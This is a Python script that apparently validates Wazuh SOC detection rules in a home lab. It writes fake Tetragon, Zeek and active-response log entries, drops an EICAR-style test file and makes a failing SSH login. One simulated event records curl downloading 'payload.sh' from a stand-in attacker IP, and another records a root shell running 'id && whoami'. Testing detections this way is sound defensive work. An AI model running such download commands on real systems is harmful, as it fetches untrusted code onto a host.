#!/usr/bin/env python3
"""
soc_alert_simulator.py
======================
SOC Rule Validation Script — triggers your Wazuh custom rules
in a safe, controlled, non-destructive way.

PURPOSE: Verify that your detection pipeline works end-to-end:
  Wazuh rule fires → Collector ingests → Dashboard shows it → Gmail sends alert

WHAT IT DOES (all safe, no real attacks):
  ① Rule 110002 (CRITICAL L13) — drops an EICAR-like test file whose MD5
      matches a hash you add to etc/lists/malware-hashes
  ② Rule 100300 (HIGH L12)    — appends a firewall-drop line to the
      active-responses log (the format Wazuh already parses)
  ③ Rule 700004 (HIGH L8)     — writes a fake Tetragon shell-exec JSON
      entry to tetragon.log (safe, just a log entry)
  ④ Rule 700005 (MED L7)      — writes a fake Tetragon wget/curl entry
  ⑤ Rule 100904 (HIGH L10)   — generates 6 rapid rejected-connection
      Zeek JSON entries in conn.log (loopback only, no real port scan)
  ⑥ Rule 100907 (HIGH L12)   — writes a Zeek SSL expired-cert entry
  ⑦ SSH auth fail (L5)        — calls ssh with a bad key to localhost,
      generating a real sshd log entry

HOW TO RUN (on the Kali agent — 192.168.200.130):
  sudo python3 soc_alert_simulator.py            # all tests
  sudo python3 soc_alert_simulator.py --rule 110002  # one rule only
  sudo python3 soc_alert_simulator.py --dry-run      # print actions, don't execute
  sudo python3 soc_alert_simulator.py --list         # list all available tests

REQUIREMENTS:
  • Python 3.10+  (no extra pip packages needed — stdlib only)
  • Run as root (to write to /var/log/tetragon/ etc.)
  • Wazuh agent must be running: systemctl status wazuh-agent

SAFE GUARANTEES:
  ✓ No real network attacks — loopback only for network tests
  ✓ No real malware — EICAR-pattern test file only
  ✓ All test files are auto-cleaned up after 30 s
  ✓ All log injections are clearly tagged [SOC-SIM]
  ✓ Dry-run mode shows every action before you commit
"""

import os
import sys
import json
import time
import hashlib
import logging
import argparse
import subprocess
import threading
from datetime import datetime, timezone
from pathlib import Path

# ─────────────────────────────────────────────────────────────────────────────
#  CONFIGURATION  — edit these paths if your environment differs
# ─────────────────────────────────────────────────────────────────────────────

CFG = {
    # Log paths (agent)
    "tetragon_log":   "/var/log/tetragon/tetragon.log",
    "zeek_conn_log":  "/opt/zeek/logs/current/conn.log",
    "zeek_ssl_log":   "/opt/zeek/logs/current/ssl.log",
    "active_resp_log":"/var/ossec/logs/active-responses.log",

    # FIM test directory (monitored by syscheck in ossec.conf)
    "fim_test_dir":   "/home/kali/Downloads",

    # Malware hash list path on manager — you need to add the test hash here
    # (see STEP 0 in the output)
    "malware_hashes": "/var/ossec/etc/lists/malware-hashes",

    # Wazuh agent service name
    "wazuh_agent_svc": "wazuh-agent",

    # Fake attacker IPs used in simulated log entries
    "fake_srcip":     "185.220.101.47",   # Tor exit node (commonly in blocklists)
    "fake_dstip":     "192.168.200.129",  # Your Wazuh manager

    # Test file cleanup delay (seconds)
    "cleanup_delay":  30,
}

# ─────────────────────────────────────────────────────────────────────────────
#  LOGGING
# ─────────────────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("soc_simulator.log"),
    ],
)
log = logging.getLogger("soc-sim")

# ANSI colours
C = {
    "red":  "\033[91m", "grn":  "\033[92m", "ylw": "\033[93m",
    "blu":  "\033[94m", "mag":  "\033[95m", "cyn": "\033[96m",
    "dim":  "\033[2m",  "bold": "\033[1m",  "rst": "\033[0m",
}

def hdr(text: str) -> str:
    return f"\n{C['bold']}{C['cyn']}{'─'*60}\n  {text}\n{'─'*60}{C['rst']}"

def ok(text: str):
    print(f"  {C['grn']}[✓]{C['rst']} {text}")
    log.info(text)

def warn(text: str):
    print(f"  {C['ylw']}[!]{C['rst']} {text}")
    log.warning(text)

def err(text: str):
    print(f"  {C['red']}[✗]{C['rst']} {text}")
    log.error(text)

def info(text: str):
    print(f"  {C['dim']}[i]{C['rst']} {text}")

# ─────────────────────────────────────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def ts_iso() -> str:
    return datetime.now(timezone.utc).isoformat()

def ts_zeek() -> float:
    return time.time()

import ctypes

def require_root(dry_run: bool):
    if dry_run:
        return

    try:
        # Linux/macOS
        is_admin = (os.geteuid() == 0)
    except AttributeError:
        # Windows
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

    if not is_admin:
        err("This script must be run as Administrator/root.")
        sys.exit(1)

def append_log(path: str, line: str, dry_run: bool) -> bool:
    """Append a single line to a log file, creating it if needed."""
    if dry_run:
        print(f"  {C['dim']}[DRY] Would append to {path}:{C['rst']}")
        print(f"       {C['dim']}{line[:120]}{C['rst']}")
        return True
    try:
        Path(path).parent.mkdir(parents=True, exist_ok=True)
        with open(path, "a") as fh:
            fh.write(line + "\n")
            fh.flush()
        return True
    except PermissionError:
        err(f"Permission denied: {path}  (did you run as root?)")
        return False
    except Exception as e:
        err(f"Could not write to {path}: {e}")
        return False

def schedule_cleanup(path: str, delay: int, dry_run: bool):
    """Delete a file after `delay` seconds in a background thread."""
    if dry_run:
        return
    def _delete():
        time.sleep(delay)
        try:
            os.remove(path)
            ok(f"Cleaned up test file: {path}")
        except FileNotFoundError:
            pass
        except Exception as e:
            warn(f"Cleanup failed for {path}: {e}")
    t = threading.Thread(target=_delete, daemon=True)
    t.start()

def check_agent_running() -> bool:
    try:
        r = subprocess.run(
            ["systemctl", "is-active", CFG["wazuh_agent_svc"]],
            capture_output=True, text=True, timeout=5
        )
        return r.stdout.strip() == "active"
    except Exception:
        return False

# ─────────────────────────────────────────────────────────────────────────────
#  TEST 1 — Rule 110002 CRITICAL L13: Malware Hash Detected (FIM/syscheck)
# ─────────────────────────────────────────────────────────────────────────────

# EICAR test file content — universally recognised as a safe AV test pattern.
# We use a variant so its MD5 is predictable and we can pre-load it into
# your malware-hashes list.
EICAR_CONTENT = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-SOC-SIM-TEST-FILE!$H+H*"
EICAR_MD5     = hashlib.md5(EICAR_CONTENT).hexdigest()

def test_110002_malware_hash(dry_run: bool):
    """
    Rule 110002 L13 CRITICAL:
      if_sid: 554, 550 (FIM file created/modified)
      list field="md5" lookup="match_key" → etc/lists/malware-hashes
    
    Steps:
      1. Tell analyst to add the test MD5 to malware-hashes on the manager
      2. Drop EICAR test file into /home/kali/Downloads/ (monitored by syscheck)
      3. Wazuh FIM detects the new file → checks MD5 → rule 110002 fires
      4. Schedule cleanup after 30 s
    """
    print(hdr("TEST 1 — Rule 110002 · CRITICAL L13 · Malware Hash via FIM"))

    test_file = Path(CFG["fim_test_dir"]) / "EICAR_SOC_SIM_TEST.exe"

    print(f"""
  {C['ylw']}STEP 0 (one-time setup on Wazuh manager){C['rst']}
  ─────────────────────────────────────────────────────
  The test MD5 must be in your malware-hashes list.
  Run this on the manager (192.168.200.129):

  {C['bold']}  sudo bash -c 'echo "{EICAR_MD5}:EICAR_SOC_SIM" >> \\
      /var/ossec/etc/lists/malware-hashes'
  sudo /var/ossec/bin/wazuh-maild -f   # reload lists{C['rst']}

  Test MD5  : {C['bold']}{EICAR_MD5}{C['rst']}
  Test file : {test_file}
  FIM dir   : {CFG['fim_test_dir']} (whodata=yes, check_all=yes in ossec.conf)
  Expected  : Rule 110002 fires within ~60s (next syscheck cycle or real-time)
    """)

    info(f"Creating test file → {test_file}")

    if dry_run:
        print(f"  {C['dim']}[DRY] Would create: {test_file} ({len(EICAR_CONTENT)} bytes, MD5={EICAR_MD5}){C['rst']}")
        print(f"  {C['dim']}[DRY] Would schedule cleanup after {CFG['cleanup_delay']}s{C['rst']}")
        return True

    try:
        Path(CFG["fim_test_dir"]).mkdir(parents=True, exist_ok=True)
        with open(test_file, "wb") as fh:
            fh.write(EICAR_CONTENT)
        ok(f"Test file created: {test_file}")
        ok(f"MD5: {EICAR_MD5}")
        warn(f"File will be auto-deleted in {CFG['cleanup_delay']}s")
        schedule_cleanup(str(test_file), CFG["cleanup_delay"], dry_run)
        return True
    except Exception as e:
        err(f"Failed to create test file: {e}")
        return False


# ─────────────────────────────────────────────────────────────────────────────
#  TEST 2 — Rule 100300 HIGH L12: Active Response firewall-drop detected
# ─────────────────────────────────────────────────────────────────────────────

def test_100300_active_response(dry_run: bool):
    """
    Rule 100300 L12:
      match: firewall-drop
    
    Injects a realistic active-response log line that Wazuh parses.
    No real firewall rule is created.
    """
    print(hdr("TEST 2 — Rule 100300 · HIGH L12 · Active Response firewall-drop"))

    now = datetime.now().strftime("%a %b %d %H:%M:%S %Z %Y")
    line = (
        f"{now} /var/ossec/active-response/bin/firewall-drop "
        f"add - {CFG['fake_srcip']} 1234 any "
        f"[SOC-SIM] Simulated firewall-drop for rule 100200"
    )

    info(f"Appending to: {CFG['active_resp_log']}")
    info(f"Line: {line[:80]}…")

    if append_log(CFG["active_resp_log"], line, dry_run):
        ok("Active-response log entry written")
        ok("Wazuh-Collector.py will pick this up on next poll (≤15s)")
        return True
    return False


# ─────────────────────────────────────────────────────────────────────────────
#  TEST 3 — Rule 700004 HIGH L8: Shell execution in container (Tetragon)
# ─────────────────────────────────────────────────────────────────────────────

def test_700004_tetragon_shell(dry_run: bool):
    """
    Rule 700004 L8:
      if_sid: 700000 (process_exec)
      field name="process_exec.process.binary": /usr/bin/sh|bash|zsh

    Injects a realistic Tetragon JSON process_exec event.
    """
    print(hdr("TEST 3 — Rule 700004 · HIGH L8 · Shell Exec in Container (Tetragon)"))

    event = {
        "process_exec": {
            "process": {
                "exec_id":   "dGVzdDoxMjM0NTY3ODkw",
                "pid":       9999,
                "uid":       0,
                "cwd":       "/root",
                "binary":    "/usr/bin/bash",
                "arguments": "-c id && whoami",
                "flags":     "execve",
                "start_time": ts_iso(),
                "pod": {
                    "namespace": "soc-sim-test",
                    "name":      "sim-container-abc123",
                    "container": {"name": "shell-test", "image": "ubuntu:22.04"},
                },
            },
            "parent": {
                "exec_id": "cGFyZW50OjAwMDAwMDAw",
                "binary":  "/usr/bin/python3",
                "pid":     9998,
            },
        },
        "node_name": "kali-node",
        "time":      ts_iso(),
        "_soc_sim":  True,    # tag so you can grep/filter these out
    }

    line = json.dumps(event)
    info(f"Injecting Tetragon process_exec event → {CFG['tetragon_log']}")

    if append_log(CFG["tetragon_log"], line, dry_run):
        ok("Tetragon shell-exec event written")
        ok("Collector parses this: _parse_tetragon_record() → level 8 MEDIUM")
        return True
    return False


# ─────────────────────────────────────────────────────────────────────────────
#  TEST 4 — Rule 700005 MED L7: wget/curl in container (Tetragon)
# ─────────────────────────────────────────────────────────────────────────────

def test_700005_tetragon_curl(dry_run: bool):
    """
    Rule 700005 L7:
      if_sid: 700000
      field name="process_exec.process.binary": /usr/bin/wget|/usr/bin/curl
    """
    print(hdr("TEST 4 — Rule 700005 · MED L7 · Remote Fetch (curl) in Container"))

    event = {
        "process_exec": {
            "process": {
                "exec_id":    "Y3VybDoxMjM0NTY3ODk=",
                "pid":        8888,
                "uid":        0,
                "cwd":        "/tmp",
                "binary":     "/usr/bin/curl",
                "arguments":  f"-s http://{CFG['fake_srcip']}/payload.sh -o /tmp/p.sh",
                "flags":      "execve",
                "start_time": ts_iso(),
                "pod": {
                    "namespace": "soc-sim-test",
                    "name":      "sim-container-abc123",
                    "container": {"name": "curl-test", "image": "ubuntu:22.04"},
                },
            },
        },
        "node_name": "kali-node",
        "time":      ts_iso(),
        "_soc_sim":  True,
    }

    line = json.dumps(event)
    info(f"Injecting Tetragon curl/wget event → {CFG['tetragon_log']}")

    if append_log(CFG["tetragon_log"], line, dry_run):
        ok("Tetragon curl event written → level 7 MEDIUM")
        return True
    return False


# ─────────────────────────────────────────────────────────────────────────────
#  TEST 5 — Rule 100904 HIGH L10: Port scan (Zeek multiple REJ conns)
# ─────────────────────────────────────────────────────────────────────────────

def test_100904_zeek_portscan(dry_run: bool):
    """
    Rule 100904 L10 (frequency=5, timeframe=20):
      if_matched_sid: 100903 (single REJ connection, L7)
      → 6 REJ connections written with timestamps 1s apart

    Uses loopback IPs only — no real port scan traffic.
    Writes directly to Zeek conn.log in JSON format.
    """
    print(hdr("TEST 5 — Rule 100904 · HIGH L10 · Port Scan (Zeek REJ × 6)"))

    ports = [22, 80, 443, 3389, 8080, 8443]   # common scan targets
    base_ts = ts_zeek()

    info(f"Writing 6 REJ entries to {CFG['zeek_conn_log']}")
    info(f"Src: {CFG['fake_srcip']}  Dst: {CFG['fake_dstip']}")

    ok_count = 0
    for i, port in enumerate(ports):
        event = {
            "ts":          base_ts + i,
            "_path":       "conn",
            "uid":         f"SOCSIMconn{i:04d}",
            "id.orig_h":   CFG["fake_srcip"],
            "id.orig_p":   40000 + i,
            "id.resp_h":   CFG["fake_dstip"],
            "id.resp_p":   port,
            "proto":       "tcp",
            "conn_state":  "REJ",        # ← this triggers rule 100903
            "duration":    0.0,
            "orig_bytes":  0,
            "resp_bytes":  0,
            "missed_bytes":0,
            "_soc_sim":    True,
        }
        if append_log(CFG["zeek_conn_log"], json.dumps(event), dry_run):
            ok_count += 1
        time.sleep(0.2)   # tiny delay so timestamps differ

    if ok_count == len(ports):
        ok(f"Written {ok_count} REJ conn entries → rule 100903 fires {ok_count}× → "
           f"rule 100904 (port scan) fires (threshold: 5 in 20s)")
        return True
    return False


# ─────────────────────────────────────────────────────────────────────────────
#  TEST 6 — Rule 100907 HIGH L12: Expired SSL Certificate (Zeek)
# ─────────────────────────────────────────────────────────────────────────────

def test_100907_zeek_expired_ssl(dry_run: bool):
    """
    Rule 100907 L12:
      if_sid: 100900
      field name="ssl_validation_status": certificate has expired
    """
    print(hdr("TEST 6 — Rule 100907 · HIGH L12 · Expired SSL Cert (Zeek)"))

    event = {
        "ts":                    ts_zeek(),
        "_path":                 "ssl",
        "uid":                   "SOCSIMssl0001",
        "id.orig_h":             CFG["fake_srcip"],
        "id.orig_p":             54321,
        "id.resp_h":             CFG["fake_dstip"],
        "id.resp_p":             443,
        "version":               "TLSv12",
        "cipher":                "TLS_RSA_WITH_AES_256_CBC_SHA",
        "curve":                 None,
        "server_name":           "expired.badactor.example.com",
        "resumed":               False,
        "established":           True,
        "ssl_validation_status": "certificate has expired",   # ← rule trigger
        "subject":               "CN=expired.badactor.example.com",
        "issuer":                "CN=BadCA",
        "not_valid_before":      "2022-01-01T00:00:00Z",
        "not_valid_after":       "2023-01-01T00:00:00Z",
        "_soc_sim":              True,
    }

    info(f"Writing expired-cert SSL event → {CFG['zeek_ssl_log']}")

    if append_log(CFG["zeek_ssl_log"], json.dumps(event), dry_run):
        ok("Zeek SSL expired-cert event written → level 12 HIGH")
        return True
    return False


# ─────────────────────────────────────────────────────────────────────────────
#  TEST 7 — Rule 100001 L5: SSH Auth Failure (real sshd log via failed attempt)
# ─────────────────────────────────────────────────────────────────────────────

def test_100001_ssh_fail(dry_run: bool):
    """
    Rule 100001 L5 (extends 5716):
      if_sid: 5716  srcip: 1.1.1.1
    
    The easiest safe way to trigger a real sshd failure is:
      ssh -o BatchMode=yes -o ConnectTimeout=3 \
          -o StrictHostKeyChecking=no \
          nonexistent_user@localhost
    This generates a real "Failed publickey for nonexistent_user" in
    /var/log/auth.log which Wazuh ingests via journald.
    
    Note: rule 100001 specifically matches srcip=1.1.1.1.
    For a generic SSH brute-force alert (rule 5712) any failed login works.
    """
    print(hdr("TEST 7 — Rule 5712 · MED L5 · SSH Authentication Failure"))

    info("Attempting SSH login with invalid user to localhost (safe — always fails)")
    info("This creates a real sshd log entry → Wazuh ingests via journald")

    if dry_run:
        print(f"  {C['dim']}[DRY] Would run: ssh -o BatchMode=yes -o ConnectTimeout=3 "
              f"soc_sim_nonexistent@localhost{C['rst']}")
        return True

    try:
        # Always fails — user doesn't exist, BatchMode means no password prompt
        result = subprocess.run(
            [
                "ssh",
                "-o", "BatchMode=yes",
                "-o", "ConnectTimeout=3",
                "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                "-p", "22",
                "soc_sim_nonexistent_user@127.0.0.1",
            ],
            capture_output=True, text=True, timeout=8
        )
        # rc=255 = SSH connection refused / auth failed — expected
        ok(f"SSH failed as expected (rc={result.returncode}) → sshd log entry created")
        ok("Check /var/log/auth.log or journalctl -u ssh | tail -5")
        return True
    except FileNotFoundError:
        warn("ssh binary not found — install openssh-client")
        return False
    except subprocess.TimeoutExpired:
        warn("SSH timed out — port 22 may not be listening")
        return False
    except Exception as e:
        err(f"SSH test error: {e}")
        return False


# ─────────────────────────────────────────────────────────────────────────────
#  TEST REGISTRY
# ─────────────────────────────────────────────────────────────────────────────

TESTS = {
    "110002": {
        "fn":      test_110002_malware_hash,
        "name":    "Malware Hash Detected (FIM)",
        "level":   13,
        "sev":     "CRITICAL",
        "rule":    "110002",
    },
    "100300": {
        "fn":      test_100300_active_response,
        "name":    "Active Response firewall-drop",
        "level":   12,
        "sev":     "HIGH",
        "rule":    "100300",
    },
    "700004": {
        "fn":      test_700004_tetragon_shell,
        "name":    "Shell exec in container (Tetragon)",
        "level":   8,
        "sev":     "MEDIUM",
        "rule":    "700004",
    },
    "700005": {
        "fn":      test_700005_tetragon_curl,
        "name":    "wget/curl in container (Tetragon)",
        "level":   7,
        "sev":     "MEDIUM",
        "rule":    "700005",
    },
    "100904": {
        "fn":      test_100904_zeek_portscan,
        "name":    "Port scan detected (Zeek 6× REJ)",
        "level":   10,
        "sev":     "HIGH",
        "rule":    "100904",
    },
    "100907": {
        "fn":      test_100907_zeek_expired_ssl,
        "name":    "Expired SSL certificate (Zeek)",
        "level":   12,
        "sev":     "HIGH",
        "rule":    "100907",
    },
    "ssh": {
        "fn":      test_100001_ssh_fail,
        "name":    "SSH auth failure (real sshd log)",
        "level":   5,
        "sev":     "LOW",
        "rule":    "5712",
    },
}

SEV_COLOR = {
    "CRITICAL": C["red"], "HIGH": C["mag"],
    "MEDIUM":   C["ylw"], "LOW":  C["grn"],
}

def list_tests():
    print(f"\n{C['bold']}Available tests:{C['rst']}\n")
    print(f"  {'--rule':<12} {'Wazuh Rule':<10} {'Level':<7} {'Severity':<10} Description")
    print(f"  {'─'*10:<12} {'─'*8:<10} {'─'*5:<7} {'─'*8:<10} {'─'*35}")
    for key, t in TESTS.items():
        sc = SEV_COLOR.get(t["sev"], "")
        print(f"  {key:<12} {t['rule']:<10} {t['level']:<7} {sc}{t['sev']:<10}{C['rst']} {t['name']}")
    print()


# ─────────────────────────────────────────────────────────────────────────────
#  RESULT SUMMARY
# ─────────────────────────────────────────────────────────────────────────────

def print_summary(results: dict):
    print(f"\n{C['bold']}{'═'*60}")
    print("  SIMULATION RESULTS")
    print(f"{'═'*60}{C['rst']}\n")

    passed = sum(1 for v in results.values() if v)
    total  = len(results)

    for key, success in results.items():
        t  = TESTS[key]
        sc = SEV_COLOR.get(t["sev"], "")
        status = f"{C['grn']}SENT{C['rst']}" if success else f"{C['red']}FAIL{C['rst']}"
        print(f"  {status}  Rule {t['rule']:<8} L{t['level']:<3} "
              f"{sc}{t['sev']:<10}{C['rst']} {t['name']}")

    print(f"\n  {C['bold']}{passed}/{total} alert simulations sent{C['rst']}")
    print(f"\n  {C['dim']}Next steps:{C['rst']}")
    print(f"  {C['dim']}  1. Dashboard  → http://localhost:8080/dashboard-V2.html{C['rst']}")
    print(f"  {C['dim']}     Filter: severity=CRITICAL/HIGH or source=zeek/tetragon{C['rst']}")
    print(f"  {C['dim']}  2. Collector  → http://localhost:5050/api/alerts?min_level=7{C['rst']}")
    print(f"  {C['dim']}  3. Gmail      → check tithsopanha0@gmail.com{C['rst']}")
    print(f"  {C['dim']}     (alerts with level ≥ 10 trigger immediate email){C['rst']}")
    print(f"  {C['dim']}  4. Wazuh logs → tail -f /var/ossec/logs/alerts/alerts.json{C['rst']}")
    print(f"  {C['dim']}  5. Manager UI → https://192.168.200.129 (Wazuh dashboard){C['rst']}")
    print(f"\n  {C['dim']}To clean up sim tags from logs:{C['rst']}")
    print(f"  {C['dim']}  grep -v SOC-SIM /var/log/tetragon/tetragon.log > /tmp/t.log{C['rst']}")
    print(f"  {C['dim']}  sudo mv /tmp/t.log /var/log/tetragon/tetragon.log{C['rst']}")
    print()


# ─────────────────────────────────────────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Wazuh SOC Alert Simulator — safe rule validation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--rule", default="all",
        help=f"Rule key to test (default: all). Options: {', '.join(TESTS.keys())}, all"
    )
    parser.add_argument(
        "--dry-run", action="store_true",
        help="Print what would happen without writing any files"
    )
    parser.add_argument(
        "--list", action="store_true",
        help="List all available tests and exit"
    )
    args = parser.parse_args()

    if args.list:
        list_tests()
        sys.exit(0)

    require_root(args.dry_run)

    # ── Banner ──────────────────────────────────────────────────────
    print(f"""
{C['bold']}{C['cyn']}╔══════════════════════════════════════════════════════════╗
║  WAZUH SOC ALERT SIMULATOR                              ║
║  Rule validation — safe, non-destructive log injection   ║
╚══════════════════════════════════════════════════════════╝{C['rst']}
  Mode    : {"DRY RUN — no files written" if args.dry_run else "LIVE — will write to log files"}
  Rule    : {args.rule}
  Manager : 192.168.200.129:55000
  Agent   : TSC-Agent (this machine)
""")

    # ── Agent health check ──────────────────────────────────────────
    if not args.dry_run:
        if check_agent_running():
            ok("Wazuh agent is running")
        else:
            warn("Wazuh agent may not be running. Start it: sudo systemctl start wazuh-agent")
            warn("Continuing anyway — log injection still works if collector tails the files")

    # ── Run selected tests ──────────────────────────────────────────
    if args.rule == "all":
        selected = list(TESTS.keys())
    elif args.rule in TESTS:
        selected = [args.rule]
    else:
        err(f"Unknown rule key: '{args.rule}'. Use --list to see options.")
        sys.exit(1)

    results = {}
    for key in selected:
        t = TESTS[key]
        try:
            results[key] = t["fn"](args.dry_run)
        except Exception as exc:
            err(f"Test {key} raised an exception: {exc}")
            log.exception(f"Test {key} exception")
            results[key] = False
        time.sleep(0.5)   # brief pause between tests

    # ── Summary ─────────────────────────────────────────────────────
    print_summary(results)


if __name__ == "__main__":
    main()